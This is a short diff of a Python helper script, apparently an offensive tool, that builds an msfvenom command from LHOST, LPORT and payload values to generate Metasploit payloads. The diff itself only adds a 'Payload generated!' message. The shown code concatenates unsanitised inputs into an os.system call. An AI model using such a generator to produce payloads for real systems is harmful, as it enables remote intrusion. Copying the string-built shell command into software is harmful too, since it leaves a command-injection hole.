@@ -25,7 +25,7 @@ def generatePayload(lhost, lport, payload, location):
 
     os.system("msfvenom -p " + payload + " LHOST=" + lhost + " LPORT=" +
               lport + " R > " + location + "/payload." + payloadTyp + " 2>/dev/null")
-
+    print("Payload generated!")
 
 def chooseOptions(options):
     choice = enquiries.choose("Which payload do you want?", options)
